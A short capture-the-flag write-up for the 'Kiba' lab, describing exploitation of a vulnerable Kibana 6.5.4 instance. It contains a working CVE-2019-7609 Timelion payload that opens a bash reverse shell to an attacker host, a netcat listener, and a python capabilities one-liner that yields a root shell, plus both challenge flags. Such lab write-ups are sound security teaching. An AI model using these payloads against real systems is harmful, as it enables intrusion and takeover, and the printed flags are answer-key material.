# Kiba

**1)** after running a scan we can see that 4 ports are open

command i used to scan all the ports:
```
rustscan $IP
```
results:
```
PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack ttl 63
80/tcp   open  http        syn-ack ttl 63
5044/tcp open  lxi-evntsvc syn-ack ttl 63
5601/tcp open  esmagent    syn-ack ttl 63
```
**2)** by opening the browser and going to **http://$IP:5601/** you will find a web app


![](https://i.imgur.com/OBJLQNj.png)

**3)** if you click into Management you will find the **version** of the webapp on the top left corner wich is **6.5.4**

![](https://i.imgur.com/uEAsjYA.png)

**4)** after some research i found the [vulnerability](https://www.cvedetails.com/cve/CVE-2019-7609/) **CVE-2019-7609** with 10.0 of CVSS score and
i also found a github [repository](https://github.com/mpgn/CVE-2019-7609) explaining this vulnerability

**5)** click into Timelion section of the website and paste this 
```javascript
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/$LHOST/$LPORT 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
replace $LHOST with your local ip addres and $LPORT with a random local port

**6)** start netcat listening on your local port
```bash
nc -lvp $LPORT
```
**7)** click run and then click **canvas** on the left side menu

**8)** after some seconds your shell should appear

**9)** then get the user flag located in /home/kiba/user.txt
```bash
cat /home/kiba/user.txt
THM{1s_easy_pwn3d_k1bana_w1th_rce}
```
**10)** the box says that root can be obtainied throught linux capabilities, then list all the capabilities with:
```bash
getcap -r /
```
after you ran this command you will see a lot of results but the most important are the latest 4 lines 
```bash
/home/kiba/.hackmeplease/python3 = cap_setuid+ep                                                                                                                                                                                           
/usr/bin/mtr = cap_net_raw+ep                                                                                                                                                                                                              
/usr/bin/traceroute6.iputils = cap_net_raw+ep                                                                                                                                                                                              
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```
wich shows a hidden directory /home/kiba/.hackmeplease and an interesting file wich is /home/kiba/.hackmeplease/python3
then by searching in gtfobins i found this [exploit](https://gtfobins.github.io/gtfobins/python/#capabilities)

**11)** then i ran the exploit
```bash
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
that gave me root shell

**12)** then get root flag
```bash
cat /root/root.txt
THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```

this was my first writeup ^^
